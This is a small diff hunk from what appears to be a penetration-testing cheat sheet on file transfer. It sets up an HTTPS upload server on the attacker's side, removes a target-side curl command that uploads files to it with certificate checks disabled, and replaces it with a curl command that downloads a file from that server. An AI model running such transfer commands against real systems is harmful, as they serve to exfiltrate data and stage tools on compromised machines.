@@ -413,9 +413,9 @@ mv ~/<FILE> .
 sudo python3 -m uploadserver --server-certificate ~/server.pem 443
 ```
 
-**Targe machine: Start Web Server**  
+**Targe machine: Download the file from the server**  
 ```bash
-curl -X POST https://<IP>/upload -F 'files=@/<FILE>' -F 'files=@/<FILE>' --insecure
+curl -k -O https://<IP>/upload/<FILE>
 ```
 
 </details>
